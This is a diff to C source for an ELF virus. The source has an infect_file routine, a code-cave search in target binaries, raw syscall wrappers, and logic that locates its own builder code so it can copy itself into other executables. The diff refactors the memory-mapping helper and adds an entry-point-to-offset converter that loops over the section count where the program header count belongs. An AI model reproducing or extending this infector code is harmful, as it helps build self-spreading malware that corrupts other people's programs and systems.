@@ -90,7 +90,7 @@ print_number_nl(int num) {
     ft_itoa(num, temp);
     prints_str_nl(temp);
 }
-typedef struct {
+typedef struct file {
     void *mem;
     uint64_t size;
 } file;
@@ -154,7 +154,7 @@ ft_malloc(uint64_t size) {
 }
 
 __attribute__((always_inline)) inline int
-ft_open(char *path, int flags, mode_t mode) {
+ft_open(volatile char *path, volatile int flags, volatile mode_t mode) {
     return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
 }
 
@@ -163,17 +163,14 @@ ft_getdents64(int fd, char dirp[], size_t count) {
     return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
 }
 
-__attribute__((always_inline)) inline file
-file_mmap(int fd) {
-    file file;
+__attribute__((always_inline)) inline void
+file_mmap(int fd, volatile file *file) {
     int off = ft_lseek(fd, 0, SEEK_END);
-    file.size = off;
+    file->size = off;
 
     off = ft_lseek(fd, 0, SEEK_SET);
 
-    file.mem = (void *)ft_mmap(0, file.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
-
-    return file;
+    file->mem = (void *)ft_mmap(0, file->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 }
 
 __attribute__((always_inline)) inline int
@@ -350,6 +347,19 @@ elf64_ident_check(volatile const Elf64_Ehdr *header) {
     return 0;
 }
 
+__attribute__((always_inline)) inline uint64_t
+e_entry_to_entry_offset(volatile file *file, volatile uint64_t e_entry) {
+    Elf64_Ehdr *header = file->mem;
+
+    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;
+
+    for (int i = 0; i < header->e_shnum; i++) {
+        Elf64_Phdr *ph = program_header_table + i;
+        if (e_entry >= ph->p_vaddr && e_entry < ph->p_vaddr + ph->p_memsz) return (e_entry + ph->p_offset) - ph->p_vaddr;
+    }
+
+    return 0;
+}
 __attribute__((always_inline)) inline int
 infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
@@ -372,7 +382,8 @@ infect_file(char *path) {
     volatile code_cave code_caves[100];
 
     prints_str_nl(path);
-    volatile file file = file_mmap(fd);
+    volatile file file;
+    file_mmap(fd, &file);
     int num = code_caves_get(code_caves, &file);
     // for (int i = 0; i < num; i++)
     //     printf("code start: 0x%lx - size 0x%lx\n", code_caves[i].start, code_caves[i].size);
@@ -384,8 +395,14 @@ infect_file(char *path) {
     if (fd < 0) return (1);
 
     ft_read(fd_self, &header, sizeof(Elf64_Ehdr));
-    uint64_t builder_start = header.e_entry;
+    file_mmap(fd_self, &file);
+    uint64_t builder_start = e_entry_to_entry_offset(&file, header.e_entry);
     uint64_t builder_size = 0xea;
+
+    ft_lseek(fd_self, builder_start + builder_size - 8, SEEK_SET);
+
+    uint64_t scaffold_table_start;
+    ft_read(fd_self, &scaffold_table_start, sizeof(scaffold_table_start));
     print_number_nl(builder_start);
     // -----------------------------------------------------------
     return (0);
